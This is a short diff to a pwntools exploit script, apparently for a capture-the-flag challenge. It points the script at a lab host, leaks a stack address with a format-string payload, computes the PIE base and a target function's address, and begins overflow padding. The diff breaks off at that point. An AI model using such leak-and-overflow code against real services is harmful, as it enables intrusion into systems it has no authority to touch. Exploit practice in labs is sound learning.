@@ -12,14 +12,14 @@ from pwn import *
 #     except EOFError:
 #         pass
 
-p = remote("SERVER", PORT)
+p = remote("192.168.0.179", 10501)
 
 payload = b'%13$p' # leak the 13th address
-p.sendlineafter("flavour: \n", payload)
+p.sendlineafter("decide: \n", payload)
 p.recvuntil("taste: \n")
 result = int(p.recvline(), 16) # convert to int so we can add offset
 
-piebase = result - 0xa49 # calculate base address
+piebase = result - 0xa49
 piefect_addr= piebase + 0x8ea # address of piefect function
 
 payload2 = b'A' * 120 # padding
